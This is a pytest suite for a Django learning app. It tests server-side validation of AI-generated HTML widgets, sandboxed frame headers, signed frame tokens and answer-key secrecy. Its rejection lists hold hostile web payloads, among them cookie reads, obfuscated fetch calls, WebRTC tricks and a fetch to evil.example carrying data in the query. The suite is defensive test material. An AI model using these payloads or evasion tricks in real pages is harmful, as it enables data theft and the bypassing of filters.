"""lx: AI-written interactive widgets — server-side validation, author-only generation, checkpoint keys never leak."""

import datetime

import pytest
from django.utils import timezone

from apps.learning.models import Enrollment, LessonWidget
from apps.learning.widget import WidgetRejected, check_answer, validate_html
from tests.test_study import _lesson, client_for

pytestmark = pytest.mark.django_db

SAFE = (
    '<div><input id="r" type="range"><output id="o"></output></div><script>var r=document.getElementById("r");'
    'r.addEventListener("input",function(){document.getElementById("o").textContent=r.value;});</script>'
)


def test_safe_widget_passes_including_svg_namespace_and_data_images():
    html = (
        SAFE
        + '<svg xmlns="http://www.w3.org/2000/svg" width="10"><circle r="4"/></svg><img src="data:image/png;base64,AAAA" alt="">'
    )
    assert validate_html(html) == html
    assert validate_html(
        SAFE + '<script>parent.postMessage({type:"aasan-widget-answer",answer:3},"*")</script>'
    )


@pytest.mark.parametrize(
    "bad",
    [
        '<script src="https://cdn.example.com/x.js"></script>',
        "<script src=//cdn.example.com/x.js></script>",
        '<link rel="stylesheet" href="https://x.y/s.css">',
        '<iframe srcdoc="<b>x</b>"></iframe>',
        '<form action="/steal"><input></form>',
        '<meta http-equiv="refresh" content="0;url=https://evil.example">',
        '<img src="https://evil.example/p.png">',
        '<a href="https://evil.example">x</a>',
        '<style>@import "x.css";</style>',
        '<div style="background:url(/x.png)"></div>',
        '<script>fetch("/api/users/me/")</script>',
        '<script>window["fe"+"tch"]; window.fetch</script>',
        "<script>var x = new XMLHttpRequest();</script>",
        '<script>new WebSocket("wss://x")</script>',
        '<script>navigator.sendBeacon("/x", "d")</script>',
        '<script>import("./m.js")</script>',
        '<script type="module">import x from "./m.js"</script>',
        '<script>eval("1+1")</script>',
        '<script>new Function("return 1")()</script>',
        '<script>setTimeout("alert(1)", 10)</script>',
        "<script>document.cookie</script>",
        '<script>localStorage.setItem("a", 1)</script>',
        '<script>window.location = "/x"</script>',
        '<script>top.document.body.innerHTML = ""</script>',
        '<script>window.open("/x")</script>',
        '<a href="javascript:alert(1)">x</a>',
    ],
)
def test_widget_validation_rejects_network_external_and_dynamic_code(bad):
    with pytest.raises(WidgetRejected):
        validate_html(SAFE + bad)


def test_widget_validation_rejects_oversized_empty_and_static():
    with pytest.raises(WidgetRejected):
        validate_html(SAFE + "<p>" + "x" * 31_000 + "</p>")
    with pytest.raises(WidgetRejected):
        validate_html("")
    with pytest.raises(WidgetRejected):
        validate_html("<p>no script, not interactive</p>")


def test_owner_generates_widget_learner_sees_it_without_key(django_capture_on_commit_callbacks):
    c, u = client_for("widget-owner@x.in")
    cur, sub, _ = _lesson(u)
    assert c.get(f"/api/learn/subsections/{sub.id}/widget/").data == {"status": "none", "can_edit": True}
    with django_capture_on_commit_callbacks(execute=True):
        r = c.post(f"/api/learn/subsections/{sub.id}/widget/", {"instructions": "EMI slider"}, format="json")
    assert r.status_code == 202
    d = c.get(f"/api/learn/subsections/{sub.id}/widget/").data
    assert d["status"] == "ready" and d["title"] == "EMI explorer" and d["has_checkpoint"] and "html" not in d
    frame = c.get(d["frame_url"])
    assert frame.status_code == 200 and b"aasan-widget-answer" in frame.content
    w = LessonWidget.objects.get(subsection=sub)
    assert (
        w.answer_key == {"kind": "number", "value": 8885.0, "tolerance": 5.0}
        and w.instructions == "EMI slider"
    )

    # A learner enrolled in the published course: sees the widget, never the key, can't regenerate.
    cur.kind, cur.visibility, cur.published_at = "authored", "link", timezone.now()
    cur.save()
    lc, lu = client_for("widget-learner@x.in")
    Enrollment.objects.create(user=lu, curriculum=cur)
    d = lc.get(f"/api/learn/subsections/{sub.id}/widget/").data
    assert d["status"] == "ready" and not d["can_edit"] and "8885" not in str(d)
    assert "answer_key" not in d and "tolerance" not in str(d)
    assert lc.post(f"/api/learn/subsections/{sub.id}/widget/", {}, format="json").status_code == 403

    # Checkpoint: number within tolerance, wrong value, junk types.
    assert lc.post(
        f"/api/learn/subsections/{sub.id}/widget/check/", {"answer": 8884.88}, format="json"
    ).data == {"correct": True}
    assert lc.post(
        f"/api/learn/subsections/{sub.id}/widget/check/", {"answer": "8,887"}, format="json"
    ).data == {"correct": True}
    assert lc.post(
        f"/api/learn/subsections/{sub.id}/widget/check/", {"answer": 9000}, format="json"
    ).data == {"correct": False}
    for junk in (None, True, {"x": 1}, [1], "x" * 101, ""):
        assert (
            lc.post(
                f"/api/learn/subsections/{sub.id}/widget/check/", {"answer": junk}, format="json"
            ).status_code
            == 400
        )

    # Strangers see nothing.
    sc, _ = client_for("widget-stranger@x.in")
    assert sc.get(f"/api/learn/subsections/{sub.id}/widget/").status_code == 404
    assert (
        sc.post(f"/api/learn/subsections/{sub.id}/widget/check/", {"answer": 1}, format="json").status_code
        == 404
    )


def test_unsafe_ai_widget_is_stored_as_failed_not_served(monkeypatch, django_capture_on_commit_callbacks):
    from llm.providers import fake_provider

    canned = dict(fake_provider.CANNED["[[TASK:lx_widget]]"])
    canned["html"] = SAFE + '<script>fetch("https://evil.example/?c=" + 1)</script>'
    monkeypatch.setitem(fake_provider.CANNED, "[[TASK:lx_widget]]", canned)
    c, u = client_for("widget-unsafe@x.in")
    _cur, sub, _ = _lesson(u)
    with django_capture_on_commit_callbacks(execute=True):
        c.post(f"/api/learn/subsections/{sub.id}/widget/", {}, format="json")
    d = c.get(f"/api/learn/subsections/{sub.id}/widget/").data
    assert d["status"] == "failed" and d["frame_url"] == "" and d["error"] == "unsafe_widget"


def test_widget_daily_cap(django_capture_on_commit_callbacks):
    from apps.learning import widget as wmod

    c, u = client_for("widget-cap@x.in")
    _cur, sub, _ = _lesson(u)
    for _ in range(wmod.WIDGETS_PER_DAY):
        with django_capture_on_commit_callbacks(execute=True):
            assert c.post(f"/api/learn/subsections/{sub.id}/widget/", {}, format="json").status_code == 202
    assert c.post(f"/api/learn/subsections/{sub.id}/widget/", {}, format="json").status_code == 429


def test_check_answer_text_and_number():
    assert check_answer({"kind": "text", "value": "Compound"}, " compound ")
    assert not check_answer({"kind": "text", "value": "Compound"}, 5)
    assert check_answer({"kind": "number", "value": 10.0, "tolerance": 0.0}, "10")
    assert not check_answer({"kind": "number", "value": 10.0, "tolerance": 0.0}, "NaN")
    assert not check_answer({}, "x")


# ── Security review fixes: obfuscation tricks + the sandboxed frame endpoint ──


@pytest.mark.parametrize(
    "bad",
    [
        '<script>var P=window["RTCPeer"+"Connection"];new P({})</script>',
        "<script>var p = new webkitRTCPeerConnection({})</script>",
        '<script>window["fe"+"tch"]("//evil")</script>',
        '<script>window["loc"+"ation"]="//evil.example/"+1</script>',
        '<script>var i=new Image();i["s"+"rc"]="//evil.example/x"</script>',
        '<script>window[String.fromCharCode(102,101,116,99,104)]("//e")</script>',
        '<script>[].constructor.constructor("return 1")()</script>',
        '<script>var l=document.createElement("li"+"nk");l.rel="dns-prefetch";document.head.appendChild(l)</script>',
        '<script>var t="link";document.createElement(t)</script>',
        '<script>document.createElement("iframe")</script>',
        "<script>globalThis.x=1</script>",
        "<script>self[k]()</script>",
        '<script>atob("ZmV0Y2g=")</script>',
    ],
)
def test_validator_rejects_obfuscation_and_webrtc(bad):
    with pytest.raises(WidgetRejected):
        validate_html(SAFE + bad)


def test_validator_still_accepts_ordinary_widgets():
    from llm.providers.fake_provider import CANNED

    assert validate_html(CANNED["[[TASK:lx_widget]]"]["html"])
    assert validate_html(
        SAFE
        + '<script>class Bar { constructor(n) { this.n = n; } } var c = document.createElement("canvas");</script>'
    )


def _ready_widget(django_capture_on_commit_callbacks, email):
    c, u = client_for(email)
    cur, sub, _ = _lesson(u)
    with django_capture_on_commit_callbacks(execute=True):
        c.post(f"/api/learn/subsections/{sub.id}/widget/", {}, format="json")
    return c, u, cur, sub, c.get(f"/api/learn/subsections/{sub.id}/widget/").data["frame_url"]


def test_frame_endpoint_serves_sandboxed_document_with_strict_headers(django_capture_on_commit_callbacks):
    from rest_framework.test import APIClient

    _c, _u, _cur, _sub, url = _ready_widget(django_capture_on_commit_callbacks, "frame@x.in")
    assert url.startswith("/api/learn/widgets/") and "?t=" in url
    r = APIClient().get(url)  # the iframe request has no Authorization header: the signed token is the grant
    assert r.status_code == 200 and r["Content-Type"].startswith("text/html")
    csp = r["Content-Security-Policy"]
    assert (
        csp.startswith("sandbox allow-scripts;")
        and "default-src 'none'" in csp
        and "connect-src 'none'" in csp
    )
    assert (
        "script-src 'unsafe-inline'" in csp
        and "img-src data:" in csp
        and "frame-ancestors 'self'" in csp
        and "allow-same-origin" not in csp
    )
    assert (
        r["X-Content-Type-Options"] == "nosniff"
        and "private" in r["Cache-Control"]
        and r["X-Frame-Options"] == "SAMEORIGIN"
    )
    assert r["X-DNS-Prefetch-Control"] == "off" and r["Referrer-Policy"] == "no-referrer"
    html = r.content.decode()
    # The bootstrap (WebRTC removal, link/frame blocking) runs before the widget's own script.
    assert html.index("RTCPeerConnection") < html.index("aasan-widget-answer") and "MutationObserver" in html
    assert html.count("<!doctype") + html.count("<!DOCTYPE") == 1


def test_frame_token_is_scoped_short_lived_and_versioned(django_capture_on_commit_callbacks, monkeypatch):
    from django.core import signing
    from rest_framework.test import APIClient

    from apps.learning import widget as wmod

    c, u, cur, sub, url = _ready_widget(django_capture_on_commit_callbacks, "frame-scope@x.in")
    anon = APIClient()
    wid = LessonWidget.objects.get(subsection=sub).id
    base, token = url.split("?t=")
    assert anon.get(base).status_code == 404  # no token
    assert anon.get(f"{base}?t={token[:-2]}xx").status_code == 404  # tampered
    assert anon.get(f"/api/learn/widgets/{wid + 1}/frame/?t={token}").status_code == 404  # other widget id
    # A token minted for a stranger (who can't view the lesson) is refused.
    _s, stranger = client_for("frame-stranger@x.in")
    w = LessonWidget.objects.get(pk=wid)
    assert anon.get(wmod.frame_url(w, stranger)).status_code == 404
    # Expired.
    real_loads = signing.loads
    monkeypatch.setattr(signing, "loads", lambda t, **kw: real_loads(t, **{**kw, "max_age": -1}))
    assert anon.get(url).status_code == 404
    monkeypatch.setattr(signing, "loads", real_loads)
    assert anon.get(url).status_code == 200
    # Regenerating the widget invalidates old frame URLs.
    LessonWidget.objects.filter(pk=wid).update(updated_at=timezone.now() + datetime.timedelta(seconds=5))
    assert anon.get(url).status_code == 404
    assert anon.post(url).status_code == 405
